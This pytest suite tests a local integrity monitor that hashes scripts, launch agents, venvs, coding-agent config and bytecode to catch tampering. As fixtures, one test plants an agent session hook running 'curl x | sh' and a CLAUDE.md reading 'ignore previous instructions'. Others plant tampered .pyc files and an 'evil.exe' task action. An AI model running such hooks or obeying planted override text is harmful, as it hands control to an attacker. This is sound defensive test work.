"""
test_integrity_monitor.py — exercises the daily integrity sweep.

Coverage
--------
- TestScanDir         file enumeration + hashing for the scripts/launchagents
                      scopes (extension filter respected; hidden files honored)
- TestScanStateDir    v1.4 addition: state_dir scope. integrity_state.json
                      is excluded; alerts.log naturally falls outside the
                      *.json glob.
- TestCountVaultMd    .trash, .obsidian, hidden directories are skipped
- TestDiffDir         NEW_FILE / CONTENT_CHANGE / DELETED detection
- TestDiffMdCount     threshold logic (50 floor, 5% relative)
- TestStateIO         save_state atomic write + load_state corruption guard
- TestEndToEnd        full --update → check → mutate → check workflow,
                      asserting that a tampered file surfaces as drift
"""
from __future__ import annotations

import hashlib
import json
import os
import re
from pathlib import Path

import pytest

import integrity_monitor as im
from platform_caps import requires_fifo


# ---------------------------------------------------------------------------
# scan_dir
# ---------------------------------------------------------------------------

class TestScanDir:

    def test_hashes_matching_extensions(self, tmp_path: Path) -> None:
        (tmp_path / "a.py").write_text("print('a')\n")
        (tmp_path / "b.sh").write_text("#!/bin/sh\necho b\n")
        (tmp_path / "c.txt").write_text("ignore me\n")
        out = im.scan_dir(tmp_path, exts={".py", ".sh"})
        assert "a.py" in out
        assert "b.sh" in out
        assert "c.txt" not in out
        # Every entry has the three required keys.
        for v in out.values():
            assert {"sha256", "size", "mtime"} <= v.keys()

    def test_returns_empty_when_dir_missing(self, tmp_path: Path) -> None:
        out = im.scan_dir(tmp_path / "does-not-exist",
                          exts={".py"})
        assert out == {}

    def test_hash_matches_hashlib(self, tmp_path: Path) -> None:
        body = b"some bytes\n"
        f = tmp_path / "x.py"
        f.write_bytes(body)
        out = im.scan_dir(tmp_path, exts={".py"})
        expected = hashlib.sha256(body).hexdigest()
        assert out["x.py"]["sha256"] == expected

    def test_recurses_subdirectories(self, tmp_path: Path) -> None:
        sub = tmp_path / "nested" / "deeper"
        sub.mkdir(parents=True)
        (sub / "deep.py").write_text("# deep\n")
        out = im.scan_dir(tmp_path, exts={".py"})
        assert any("deep.py" in k for k in out)


# ---------------------------------------------------------------------------
# scan_state_dir — v1.4 addition.
# ---------------------------------------------------------------------------

class TestScanStateDir:

    def test_includes_plugin_allowlist(self, tmp_state_dir: Path) -> None:
        (tmp_state_dir / "plugin_allowlist.json").write_text(
            '{"state": {}, "hmac": "x"}')
        out = im.scan_state_dir()
        assert "plugin_allowlist.json" in out

    def test_excludes_integrity_state_self(self,
                                           tmp_state_dir: Path) -> None:
        """Including integrity_state.json would be a chicken-and-egg
        because save_state writes that file with hashes that include
        its own — no fixed-point exists for SHA-256 over self."""
        (tmp_state_dir / "integrity_state.json").write_text(
            '{"updated_at": "2026-05-05"}')
        (tmp_state_dir / "plugin_allowlist.json").write_text("{}")
        out = im.scan_state_dir()
        assert "plugin_allowlist.json" in out
        assert "integrity_state.json" not in out

    @requires_fifo
    def test_fifo_is_reported_not_opened(self, tmp_state_dir: Path) -> None:
        """A FIFO planted as plugin_allowlist.json blocked this scan forever
        (adversarial review round 2, 2026-09-25). It must be recorded -- so it
        differs from the baseline hash -- without being read."""
        import os
        os.mkfifo(tmp_state_dir / "plugin_allowlist.json")
        out = im.scan_state_dir()          # returns: would hang if it opened it
        assert out["plugin_allowlist.json"] == {"error": "not a regular file"}

    def test_prompt_and_config_files_are_now_hashed(self, tmp_path: Path) -> None:
        for name in ("meeting_pull_prompt.txt", "requirements.txt",
                     "meeting_handoff_transform.js", "DashboardActions.applescript",
                     "voice_cleanup_config.yaml"):
            (tmp_path / name).write_text("x")
        out = im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS)
        assert len(out) == 5, sorted(out)

    def test_excludes_alerts_log_naturally(self,
                                           tmp_state_dir: Path) -> None:
        """alerts.log is not .json, so the glob already excludes it."""
        (tmp_state_dir / "alerts.log").write_text(
            '{"control": "x"}\n{"control": "y"}\n')
        out = im.scan_state_dir()
        assert "alerts.log" not in out

    def test_empty_state_dir(self, tmp_state_dir: Path) -> None:
        out = im.scan_state_dir()
        assert out == {}


# ---------------------------------------------------------------------------
# count_vault_md
# ---------------------------------------------------------------------------

class TestCountVaultMd:

    def test_counts_top_level(self, sample_vault: Path) -> None:
        n = im.count_vault_md(sample_vault)
        # sample_vault fixture creates 10 root-level notes.
        assert n == 10

    def test_skips_trash(self, sample_vault: Path) -> None:
        # The fixture has .trash/deleted.md — must not be counted.
        before = im.count_vault_md(sample_vault)
        (sample_vault / ".trash" / "another.md").write_text("# x\n")
        after = im.count_vault_md(sample_vault)
        assert before == after

    def test_skips_obsidian_config(self, sample_vault: Path) -> None:
        before = im.count_vault_md(sample_vault)
        (sample_vault / ".obsidian" / "more.md").write_text("# x\n")
        after = im.count_vault_md(sample_vault)
        assert before == after

    def test_returns_zero_on_missing_dir(self, tmp_path: Path) -> None:
        assert im.count_vault_md(tmp_path / "ghost") == 0


# ---------------------------------------------------------------------------
# diff_dir
# ---------------------------------------------------------------------------

class TestDiffDir:

    def test_detects_new_file(self) -> None:
        baseline: dict = {}
        current = {"a.py": {"sha256": "h1", "size": 10, "mtime": 1}}
        findings = im.diff_dir("scripts", current, baseline)
        assert len(findings) == 1
        assert findings[0]["kind"] == "NEW_FILE"
        assert findings[0]["path"] == "a.py"

    def test_detects_content_change(self) -> None:
        baseline = {"a.py": {"sha256": "old", "size": 10, "mtime": 1}}
        current = {"a.py": {"sha256": "new", "size": 12, "mtime": 2}}
        findings = im.diff_dir("scripts", current, baseline)
        assert len(findings) == 1
        assert findings[0]["kind"] == "CONTENT_CHANGE"
        assert findings[0]["old_sha"] == "old"
        assert findings[0]["new_sha"] == "new"

    def test_detects_deletion(self) -> None:
        baseline = {"a.py": {"sha256": "h", "size": 10, "mtime": 1}}
        current: dict = {}
        findings = im.diff_dir("scripts", current, baseline)
        assert len(findings) == 1
        assert findings[0]["kind"] == "DELETED"

    def test_no_findings_when_identical(self) -> None:
        state = {"a.py": {"sha256": "h", "size": 10, "mtime": 1}}
        findings = im.diff_dir("scripts", state, state)
        assert findings == []

    def test_scope_propagated_to_findings(self) -> None:
        baseline = {"f.json": {"sha256": "old", "size": 1, "mtime": 1}}
        current = {"f.json": {"sha256": "new", "size": 1, "mtime": 2}}
        findings = im.diff_dir("state_dir", current, baseline)
        assert findings[0]["scope"] == "state_dir"


# ---------------------------------------------------------------------------
# diff_md_count
# ---------------------------------------------------------------------------

class TestDiffMdCount:

    def test_no_finding_when_count_grows(self) -> None:
        assert im.diff_md_count(1900, 1850) is None

    def test_no_finding_when_drop_below_floor_and_ratio(self) -> None:
        # Floor 50, baseline 100 → 5% = 5 → threshold = 50; drop of 10 is fine.
        assert im.diff_md_count(90, 100) is None

    def test_finding_when_drop_meets_floor(self) -> None:
        # baseline 200, current 140 → drop 60 ≥ FLOOR 50 → fires.
        finding = im.diff_md_count(140, 200)
        assert finding is not None
        assert finding["kind"] == "BULK_DELETE"
        assert finding["deleted"] == 60

    def test_finding_when_drop_meets_ratio(self) -> None:
        # baseline 1000, current 940 → drop 60. FLOOR 50 < drop. fires.
        finding = im.diff_md_count(940, 1000)
        assert finding is not None
        assert finding["deleted"] == 60

    def test_no_finding_when_baseline_zero(self) -> None:
        # First run — no baseline — never fire BULK_DELETE.
        assert im.diff_md_count(0, 0) is None


# ---------------------------------------------------------------------------
# State I/O
# ---------------------------------------------------------------------------

class TestStateIO:

    def test_save_then_load_round_trip(self, tmp_state_dir: Path) -> None:
        state = {"scripts": {"x.py": {"sha256": "h"}},
                 "vault_md_count": 100}
        im.save_state(state)
        loaded = im.load_state()
        assert loaded["scripts"]["x.py"]["sha256"] == "h"
        assert loaded["vault_md_count"] == 100
        assert "updated_at" in loaded

    def test_save_uses_atomic_rename(self, tmp_state_dir: Path) -> None:
        """save_state should write a .tmp first then os.replace it."""
        im.save_state({"vault_md_count": 5})
        # No leftover .tmp file in the directory.
        assert not list(tmp_state_dir.glob("*.tmp"))
        assert (tmp_state_dir / "integrity_state.json").exists()

    def test_save_restricts_to_owner(self, tmp_state_dir: Path,
                                     assert_owner_only,
                                     allow_subprocess: None) -> None:
        """The state file is owner-only however the platform spells that:
        chmod 0600 on POSIX, an icacls ACL on Windows."""
        im.save_state({"vault_md_count": 0})
        assert_owner_only(tmp_state_dir / "integrity_state.json")

    def test_load_state_missing_returns_empty(self,
                                              tmp_state_dir: Path) -> None:
        # Nothing written yet.
        assert im.load_state() == {}

    def test_load_state_corrupt_exits(self, tmp_state_dir: Path) -> None:
        (tmp_state_dir / "integrity_state.json").write_text("{not json")
        with pytest.raises(SystemExit) as exc:
            im.load_state()
        assert exc.value.code == 2


# ---------------------------------------------------------------------------
# End-to-end main() flow.
# ---------------------------------------------------------------------------

class TestEndToEnd:
    """Drive integrity_monitor.main() via argv across a baseline → check
    → mutate → check cycle. Asserts that a bit-flip in one of the
    scripts surfaces as CONTENT_CHANGE drift."""

    @pytest.fixture
    def sandbox(self, tmp_path: Path, sample_vault: Path,
                tmp_state_dir: Path) -> dict:
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "alpha.py").write_text("# alpha v1\n")
        (scripts / "beta.sh").write_text("#!/bin/sh\necho hi\n")
        agents = tmp_path / "LaunchAgents"
        agents.mkdir()
        (agents / "com.example.plist").write_text(
            "<?xml version='1.0'?><plist><dict/></plist>")
        return {
            "scripts": scripts,
            "agents": agents,
            "vault": sample_vault,
        }

    def _argv(self, sandbox: dict, *extra: str) -> list[str]:
        return [
            "--scripts-dir", str(sandbox["scripts"]),
            "--launchagents-dir", str(sandbox["agents"]),
            "--vault", str(sandbox["vault"]),
            *extra,
        ]

    def test_first_run_with_no_baseline_emits_no_baseline(
            self, sandbox: dict, silent_notify: list,
            capsys: pytest.CaptureFixture) -> None:
        rc = im.main(self._argv(sandbox))
        assert rc == 2
        # Notification fired about no baseline.
        assert any("baseline" in m.lower()
                   for _, m in silent_notify)

    def test_update_then_clean_check(self, sandbox: dict,
                                      silent_notify: list,
                                      capsys: pytest.CaptureFixture) -> None:
        assert im.main(self._argv(sandbox, "--update")) == 0
        # Second run (no --update) finds no drift.
        rc = im.main(self._argv(sandbox))
        assert rc == 0

    def test_update_refreshes_the_jobs_recorded_status(
            self, sandbox: dict, silent_notify: list,
            silent_kickstart: list) -> None:
        # Rebaselining by hand leaves launchd's LastExitStatus pinned to the
        # drift run that prompted it, so the dashboard reports this control as
        # failing while the state is clean. --update has to refresh it.
        assert im.main(self._argv(sandbox, "--update")) == 0
        assert [c[0] for c in silent_kickstart] == [im.AGENT_LABEL]

    def test_a_plain_check_never_kickstarts(
            self, sandbox: dict, silent_notify: list,
            silent_kickstart: list) -> None:
        # The kickstarted run executes this script WITHOUT --update. If a plain
        # check also kickstarted, that run would trigger another, and the
        # control would spin forever -- the exact class of self-triggering loop
        # the WatchPaths fix removed.
        assert im.main(self._argv(sandbox, "--update")) == 0
        silent_kickstart.clear()
        im.main(self._argv(sandbox))
        assert silent_kickstart == []

    def test_mutated_script_surfaces_as_drift(
            self, sandbox: dict, silent_notify: list,
            capsys: pytest.CaptureFixture) -> None:
        assert im.main(self._argv(sandbox, "--update")) == 0
        # Tamper with one of the scanned files.
        (sandbox["scripts"] / "alpha.py").write_text("# alpha v2 (TAMPER)\n")
        rc = im.main(self._argv(sandbox))
        assert rc == 1, "expected drift exit code"
        # And that drift was reported via the notify path.
        assert any("ALERT" in t or "alpha" in m.lower()
                   for t, m in silent_notify)

    # -- Windows task enumeration failing (M-DASH #68/#270) ---------------
    # The PowerShell scan used to return {} on any failure, the same as "no
    # tasks", so an --update while it was failing saved an empty baseline.
    # main() is driven through the real scan_scheduled_tasks() on any host by
    # pointing scan_persistence at it and faking the PowerShell result.

    @staticmethod
    def _windows_scan(monkeypatch, *, stdout: bytes = b"", rc: int = 0,
                      stderr: bytes = b"") -> list:
        seen: list = []

        def fake_run(*a, **k):
            seen.append(a[0])
            return subprocess.CompletedProcess(a[0], rc, stdout, stderr)

        monkeypatch.setattr(im, "scan_persistence",
                            lambda _la: im.scan_scheduled_tasks())
        monkeypatch.setattr(im.subprocess, "run", fake_run)
        return seen

    def test_update_refuses_when_task_enumeration_fails(
            self, sandbox: dict, silent_notify: list, monkeypatch,
            capsys: pytest.CaptureFixture) -> None:
        self._windows_scan(monkeypatch, stdout=b"")
        rc = im.main(self._argv(sandbox, "--update"))
        assert rc == 2
        assert "REFUSED --update: could not enumerate the scheduled tasks" \
            in capsys.readouterr().out
        assert not im.STATE_PATH.exists(), "an empty task baseline was saved"

    def test_check_reports_scan_failed_not_a_deleted_per_task(
            self, sandbox: dict, silent_notify: list, monkeypatch) -> None:
        task = json.dumps({"Obsidian Tagger": "<Task>x</Task>"}).encode()
        self._windows_scan(monkeypatch, stdout=task)
        assert im.main(self._argv(sandbox, "--update")) == 0
        assert list(im.load_state()["launchagents"]) == ["Obsidian Tagger"]

        self._windows_scan(monkeypatch, stdout=b"", rc=1)
        assert im.main(self._argv(sandbox)) == 1, "a failed scan must stay loud"
        alert = " ".join(m for _, m in silent_notify)
        assert "launchagents: scan failed (PowerShell exited 1)" in alert
        assert "DELETED" not in alert

    @pytest.mark.parametrize("stdout,rc,marker", [
        (b"", 0, "PowerShell returned no output"),
        (b"{}", 3, "PowerShell exited 3"),
        (b"not json", 0, "unparseable task list"),
        (b"[1, 2]", 0, "task list is a list, not an object"),
    ])
    def test_every_enumeration_failure_is_distinct_from_no_tasks(
            self, monkeypatch, stdout: bytes, rc: int, marker: str) -> None:
        self._windows_scan(monkeypatch, stdout=stdout, rc=rc)
        with pytest.raises(im.PersistenceScanError, match=marker):
            im.scan_scheduled_tasks()

    def test_no_tasks_is_still_an_empty_scan(self, monkeypatch) -> None:
        self._windows_scan(monkeypatch, stdout=b"{}")
        assert im.scan_scheduled_tasks() == {}

    # -- review follow-up: the PowerShell must not silence its own errors --

    def test_the_task_scan_stops_on_errors_instead_of_silencing_them(
            self, monkeypatch) -> None:
        """Under 'SilentlyContinue' an access-denied or CIM failure from
        Get-ScheduledTask still printed "{}" and exit 0 -- "no tasks"."""
        seen = self._windows_scan(monkeypatch, stdout=b"{}")
        im.scan_scheduled_tasks()
        script = seen[0][-1]
        assert "$ErrorActionPreference='Stop'" in script
        assert "SilentlyContinue" not in script
        # Only a missing \Obsidian\ folder means "no tasks"; the rest exits 3.
        assert "$_.CategoryInfo.Category -eq 'ObjectNotFound'" in script
        assert "[Console]::Error.WriteLine($_.Exception.Message);exit 3" in script
        assert "if(-not $x){throw ('export returned nothing for '" in script

    def test_a_failed_enumeration_names_its_cause_and_blocks_update(
            self, sandbox: dict, silent_notify: list, monkeypatch,
            capsys: pytest.CaptureFixture) -> None:
        self._windows_scan(monkeypatch, stdout=b"", rc=3,
                           stderr=b"Access is denied.\r\n")
        with pytest.raises(im.PersistenceScanError,
                           match=r"PowerShell exited 3: Access is denied\."):
            im.scan_scheduled_tasks()
        assert im.main(self._argv(sandbox, "--update")) == 2
        assert "(PowerShell exited 3: Access is denied.)" in capsys.readouterr().out
        assert not im.STATE_PATH.exists()

    @pytest.mark.parametrize("value", [None, "", 7])
    def test_a_task_without_an_exported_definition_is_a_scan_failure(
            self, monkeypatch, value) -> None:
        """It used to be dropped from the scan, i.e. silently unwatched."""
        task = json.dumps({"Obsidian Tagger": value}).encode()
        self._windows_scan(monkeypatch, stdout=task)
        with pytest.raises(im.PersistenceScanError,
                           match="no exported definition for task 'Obsidian Tagger'"):
            im.scan_scheduled_tasks()


# ---------------------------------------------------------------------------
# Coverage added 2026-10-03: templates, venv, agent config, secrets, bytecode.
# ---------------------------------------------------------------------------

import importlib.util
import marshal
import py_compile
import shutil
import stat
import subprocess
import sys


class TestNewScopes:

    def test_templates_are_hashed_and_scripts_left_to_their_scope(self, tmp_path: Path) -> None:
        t = tmp_path / "Templates"
        (t / "QuickAdd").mkdir(parents=True)
        (t / "Scripts").mkdir()
        (t / "Note Template.md").write_text("x")
        (t / "QuickAdd" / "new_meeting.js").write_text("y")
        (t / "Scripts" / "x.py").write_text("z")
        (t / "image.png").write_bytes(b"\x89")
        assert sorted(im.scan_templates(tmp_path)) == ["Note Template.md", "QuickAdd/new_meeting.js"]

    def test_venv_code_files_config_and_interpreter_links(self, tmp_path: Path) -> None:
        v = tmp_path / ".venv"
        sp = v / "lib" / "python3.13" / "site-packages"
        (sp / "pkg" / "__pycache__").mkdir(parents=True)
        (v / "bin").mkdir()
        for rel, body in {"pyvenv.cfg": "home = /x", "bin/python3": "", "bin/activate": "",
                          "lib/python3.13/site-packages/evil.pth": "import os",
                          "lib/python3.13/site-packages/pkg/__init__.py": "",
                          "lib/python3.13/site-packages/pkg/__pycache__/__init__.cpython-313.pyc": "",
                          "lib/python3.13/site-packages/pkg/_ext.so": "",
                          "lib/python3.13/site-packages/pkg/data.txt": "",
                          "include/x.h": ""}.items():
            (v / rel).parent.mkdir(parents=True, exist_ok=True)
            (v / rel).write_text(body)
        got = sorted(im.scan_venv(v))
        assert "lib/python3.13/site-packages/evil.pth" in got
        assert "lib/python3.13/site-packages/pkg/__pycache__/__init__.cpython-313.pyc" in got
        assert {"pyvenv.cfg", "bin/python3", "bin/activate"} <= set(got)
        assert not any(g.endswith((".txt", ".h")) for g in got)

    def test_planted_modules_beside_the_scripts_are_watched(self, tmp_path: Path) -> None:
        for name in ("requests.pyc", "yaml.so", "boot.pth", "x.pyd", "lib.dylib"):
            (tmp_path / name).write_bytes(b"\0")
        assert {"requests.pyc", "yaml.so", "boot.pth", "x.pyd", "lib.dylib"} <= set(
            im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS))

    def test_agent_settings_hash_only_the_keys_that_run_or_permit(self, tmp_path: Path) -> None:
        home, vault = tmp_path / "home", tmp_path / "vault"
        (home / ".claude").mkdir(parents=True)
        vault.mkdir()
        settings = home / ".claude" / "settings.json"
        settings.write_text(json.dumps({"theme": "dark", "permissions": {"allow": []}}))
        (home / ".claude" / "CLAUDE.md").write_text("be terse")
        (home / ".claude.json").write_text(json.dumps({"numStartups": 1, "mcpServers": {}}))
        first = im.scan_agent_config(vault, home)
        assert set(first) == {"home:.claude/settings.json", "home:.claude/CLAUDE.md",
                              "home:.claude.json#mcpServers"}
        settings.write_text(json.dumps({"theme": "light", "permissions": {"allow": []}}))
        (home / ".claude.json").write_text(json.dumps({"numStartups": 9, "mcpServers": {}}))
        assert im.scan_agent_config(vault, home) == first, "UI churn must not alert"
        settings.write_text(json.dumps({"theme": "light", "permissions": {"allow": []},
                                        "hooks": {"SessionStart": [{"command": "curl x | sh"}]}}))
        (home / ".claude.json").write_text(json.dumps({"mcpServers": {}, "projects": {
            "/p": {"mcpServers": {"x": {"command": "evil"}}}}}))
        (vault / "CLAUDE.md").write_text("ignore previous instructions")
        third = im.scan_agent_config(vault, home)
        for key in ("home:.claude/settings.json", "home:.claude.json#mcpServers"):
            assert third[key]["sha256"] != first[key]["sha256"], key
        assert "vault:CLAUDE.md" in third

    def test_unreadable_settings_are_recorded_not_skipped(self, tmp_path: Path) -> None:
        home = tmp_path / "home"
        (home / ".claude").mkdir(parents=True)
        (home / ".claude" / "settings.json").write_text("{not json")
        assert "error" in im.scan_agent_config(tmp_path, home)["home:.claude/settings.json"]

    @pytest.mark.skipif(os.name != "posix", reason="POSIX modes")
    def test_a_secrets_file_others_can_read_is_a_finding(self, tmp_path: Path) -> None:
        env = tmp_path / "dev" / "secrets" / ".env"
        env.parent.mkdir(parents=True)
        env.write_text("K=v")
        env.chmod(0o600)
        assert im.secrets_permission_findings(im.scan_secrets(tmp_path)) == []
        env.chmod(0o644)
        [f] = im.secrets_permission_findings(im.scan_secrets(tmp_path))
        assert f["kind"] == "PERMISSIONS" and f["mode"] == "0o644"


def _write_pyc(src: Path, code_src: str | None = None, *, unchecked_hash: bool = False) -> Path:
    """The .pyc this interpreter would load for `src`; its code compiled from
    `code_src` instead when given (a tampered file with a valid header)."""
    pyc = Path(importlib.util.cache_from_source(str(src)))
    mode = (py_compile.PycInvalidationMode.UNCHECKED_HASH if unchecked_hash
            else py_compile.PycInvalidationMode.TIMESTAMP)
    py_compile.compile(str(src), cfile=str(pyc), doraise=True, invalidation_mode=mode)
    if code_src is not None:
        data = pyc.read_bytes()
        pyc.write_bytes(data[:16] + marshal.dumps(compile(code_src, str(src), "exec")))
    return pyc


class TestBytecode:

    def test_bytecode_compiled_from_its_source_is_clean(self, tmp_path: Path) -> None:
        src = tmp_path / "security_common.py"
        src.write_text("def ok():\n    return 1\n")
        _write_pyc(src)
        assert im.bytecode_findings(tmp_path) == []

    def test_tampered_bytecode_behind_a_valid_header_is_found(self, tmp_path: Path) -> None:
        src = tmp_path / "security_common.py"
        src.write_text("def ok():\n    return 1\n")
        pyc = _write_pyc(src, "def ok():\n    return 0\n")
        [f] = im.bytecode_findings(tmp_path)
        assert f["kind"] == "BYTECODE_MISMATCH" and f["path"] == str(pyc)
        assert f["detail"] == "does not match its source"

    def test_unchecked_hash_bytecode_is_checked_whatever_the_source(self, tmp_path: Path) -> None:
        src = tmp_path / "templater_guard.py"
        src.write_text("X = 1\n")
        _write_pyc(src, "X = 2\n", unchecked_hash=True)
        src.write_text("X = 1\n# edited since\n")       # Python loads it anyway
        [f] = im.bytecode_findings(tmp_path)
        assert f["kind"] == "BYTECODE_MISMATCH"

    def test_stale_bytecode_is_not_a_finding(self, tmp_path: Path) -> None:
        """Python recompiles a .pyc whose timestamp no longer matches."""
        src = tmp_path / "m.py"
        src.write_text("X = 1\n")
        _write_pyc(src, "X = 2\n")
        src.write_text("X = 1  # longer now\n")
        assert im.bytecode_findings(tmp_path) == []

    def test_another_versions_bytecode_is_ignored(self, tmp_path: Path) -> None:
        src = tmp_path / "m.py"
        src.write_text("X = 1\n")
        pyc = _write_pyc(src, "X = 2\n")
        pyc.write_bytes(b"\x00\x00\r\n" + pyc.read_bytes()[4:])
        assert im.bytecode_findings(tmp_path) == []

    def test_the_venv_interpreter_checks_its_own_cache(self, tmp_path: Path, allow_subprocess) -> None:
        """A child run of the venv interpreter, with its own imports kept out
        of the cache it is checking."""
        scripts = tmp_path / "scripts"
        (scripts / ".venv" / "bin").mkdir(parents=True)
        wrapper = scripts / ".venv" / "bin" / "python3"
        wrapper.write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n')
        wrapper.chmod(0o755)
        src = scripts / "m.py"
        src.write_text("X = 1\n")
        pyc = src.parent / "__pycache__" / f"m.{sys.implementation.cache_tag}.pyc"
        pyc.parent.mkdir()
        py_compile.compile(str(src), cfile=str(pyc), doraise=True)
        pyc.write_bytes(pyc.read_bytes()[:16] + marshal.dumps(compile("X = 2\n", str(src), "exec")))
        if os.name != "posix":
            pytest.skip("shell wrapper")
        [f] = im.venv_bytecode_findings(scripts)
        assert f["kind"] == "BYTECODE_MISMATCH" and f["path"] == str(pyc)


class TestNotBaselined:

    def test_a_baseline_from_before_a_scope_reports_it_once(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, capsys: pytest.CaptureFixture) -> None:
        scripts = tmp_path / "scripts"
        (scripts / ".venv" / "lib").mkdir(parents=True)
        for i in range(30):
            (scripts / ".venv" / "lib" / f"m{i}.py").write_text("")
        agents = tmp_path / "LaunchAgents"
        agents.mkdir()
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents),
                "--vault", str(sample_vault)]
        assert im.main([*argv, "--update"]) == 0
        state = json.loads(im.STATE_PATH.read_text())
        for scope in ("script_config", "templates", "venv", "user_site", "agent_config", "secrets"):
            state.pop(scope)
        im.STATE_PATH.write_text(json.dumps(state))
        capsys.readouterr()
        assert im.main([*argv, "--json"]) == 1
        findings = json.loads(capsys.readouterr().out)["findings"]
        assert sorted((f["kind"], f["scope"]) for f in findings) == [
            ("NOT_BASELINED", s) for s in ("agent_config", "script_config", "secrets",
                                           "templates", "user_site", "venv")]
        assert [f["count"] for f in findings if f["scope"] == "venv"] == [30]



class TestReviewRoundOne:
    """Gaps an adversarial review of the new coverage found (2026-10-03)."""

    def test_the_jobs_own_config_files_are_hashed(self, tmp_path: Path) -> None:
        cfg = tmp_path / ".config"
        cfg.mkdir()
        (cfg / "meeting_pull.json").write_text('{"search_tool": "x"}')
        (cfg / "notes.txt").write_text("ignored")
        assert sorted(im.scan_script_config(tmp_path)) == ["meeting_pull.json"]
        assert "meeting_pull.json" not in str(im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS | {".json"}))

    def test_the_user_site_is_watched(self, tmp_path: Path) -> None:
        site = tmp_path / "Library" / "Python" / "3.9" / "lib" / "python" / "site-packages"
        site.mkdir(parents=True)
        (site / "usercustomize.py").write_text("import os")
        (site / "x.pth").write_text("import os")
        got = im.scan_user_site(tmp_path)
        assert {"Python/3.9/lib/python/site-packages/usercustomize.py",
                "Python/3.9/lib/python/site-packages/x.pth"} == set(got)

    def test_ca_bundles_registries_and_pyw_are_watched(self, tmp_path: Path) -> None:
        v = tmp_path / ".venv"
        for rel in ("lib/site-packages/certifi/cacert.pem", "lib/site-packages/x.dist-info/entry_points.txt",
                    "Lib/site-packages/mod.pyw"):
            (v / rel).parent.mkdir(parents=True, exist_ok=True)
            (v / rel).write_text("x")
        assert len(im.scan_venv(v)) == 3
        (tmp_path / "shadow.pyw").write_text("x")
        assert "shadow.pyw" in im.scan_dir(tmp_path, exts=im.SCRIPT_EXTS)

    def test_every_pyc_in_a_cache_prefix_is_checked(self, tmp_path: Path,
                                                    monkeypatch: pytest.MonkeyPatch) -> None:
        """Apple's python caches the standard library too, in a user-writable
        tree; a tampered json.pyc there would run in every security control."""
        src_dir = tmp_path / "lib"
        src_dir.mkdir()
        src = src_dir / "jsonish.py"
        src.write_text("def dumps():\n    return 1\n")
        prefix = tmp_path / "cache"
        tag = sys.implementation.cache_tag
        pyc = prefix / src_dir.relative_to(src_dir.anchor) / f"jsonish.{tag}.pyc"
        pyc.parent.mkdir(parents=True)
        py_compile.compile(str(src), cfile=str(pyc), doraise=True)
        monkeypatch.setattr(sys, "pycache_prefix", str(prefix))
        assert im.prefix_cache_findings() == []
        pyc.write_bytes(pyc.read_bytes()[:16] + marshal.dumps(compile("def dumps():\n    return 0\n", str(src), "exec")))
        [f] = im.prefix_cache_findings()
        assert f["kind"] == "BYTECODE_MISMATCH" and f["path"] == str(pyc)
        monkeypatch.setattr(sys, "pycache_prefix", None)
        assert im.prefix_cache_findings() == []

    def test_the_child_check_runs_isolated(self) -> None:
        src = Path(im.__file__).read_text(encoding="utf-8")
        assert '"-E", "-s", "-S", "-B", "-X", f"pycache_prefix={empty}"' in src

    def test_a_tampered_prefix_cache_reaches_the_report(
            self, tmp_path: Path, sample_vault: Path, tmp_state_dir: Path,
            silent_notify: list, monkeypatch: pytest.MonkeyPatch,
            capsys: pytest.CaptureFixture) -> None:
        src_dir = tmp_path / "lib"
        src_dir.mkdir()
        src = src_dir / "jsonish.py"
        src.write_text("X = 1\n")
        prefix = tmp_path / "cache"
        pyc = prefix / src_dir.relative_to(src_dir.anchor) / f"jsonish.{sys.implementation.cache_tag}.pyc"
        pyc.parent.mkdir(parents=True)
        py_compile.compile(str(src), cfile=str(pyc), doraise=True)
        pyc.write_bytes(pyc.read_bytes()[:16] + marshal.dumps(compile("X = 2\n", str(src), "exec")))
        scripts, agents = tmp_path / "scripts", tmp_path / "agents"
        scripts.mkdir(); agents.mkdir()
        argv = ["--scripts-dir", str(scripts), "--launchagents-dir", str(agents), "--vault", str(sample_vault)]
        assert im.main([*argv, "--update"]) == 0
        monkeypatch.setattr(sys, "pycache_prefix", str(prefix))
        capsys.readouterr()
        assert im.main([*argv, "--json"]) == 1
        [f] = json.loads(capsys.readouterr().out)["findings"]
        assert f["kind"] == "BYTECODE_MISMATCH" and f["path"] == str(pyc)


    def test_the_scripts_folders_claude_settings_are_watched(self, tmp_path: Path) -> None:
        d = tmp_path / "vault" / "Templates" / "Scripts" / ".claude"
        d.mkdir(parents=True)
        (d / "settings.local.json").write_text('{"permissions": {"allow": ["Bash"]}}')
        assert "scripts:.claude/settings.local.json" in im.scan_agent_config(tmp_path / "vault", tmp_path)


# ---------------------------------------------------------------------------
# Re-registering a task is not drift (a Windows report, 2026-10-11)
# ---------------------------------------------------------------------------

def _task_xml(*, registered: str, daily_at: str = "05:00:00", exe: str = "pythonw.exe") -> str:
    return (f"<Task><RegistrationInfo><Date>{registered}</Date></RegistrationInfo><Triggers>"
            f"<CalendarTrigger><StartBoundary>{registered[:10]}T{daily_at}-04:00</StartBoundary>"
            f"<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger>"
            f"<TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition>"
            f"<StartBoundary>{registered}-04:00</StartBoundary></TimeTrigger></Triggers>"
            f"<Actions><Exec><Command>{exe}</Command></Exec></Actions></Task>")


def _scan(monkeypatch, xml: str) -> dict:
    out = json.dumps({"vault-lint": xml}).encode()
    monkeypatch.setattr(im.subprocess, "run",
                        lambda *a, **k: subprocess.CompletedProcess(a[0], 0, out, b""))
    return im.scan_scheduled_tasks()


def test_a_reregistration_alone_is_not_drift(monkeypatch) -> None:
    before = _scan(monkeypatch, _task_xml(registered="2026-10-05T13:19:02"))
    after = _scan(monkeypatch, _task_xml(registered="2026-10-11T14:13:13"))
    assert im.diff_dir("launchagents", after, before) == []


@pytest.mark.parametrize("change", [{"daily_at": "03:00:00"}, {"exe": "evil.exe"}])
def test_a_changed_schedule_or_action_is_still_drift(monkeypatch, change) -> None:
    before = _scan(monkeypatch, _task_xml(registered="2026-10-05T13:19:02"))
    after = _scan(monkeypatch, _task_xml(registered="2026-10-11T14:13:13", **change))
    [f] = im.diff_dir("launchagents", after, before)
    assert f["kind"] == "CONTENT_CHANGE" and f["path"] == "vault-lint"


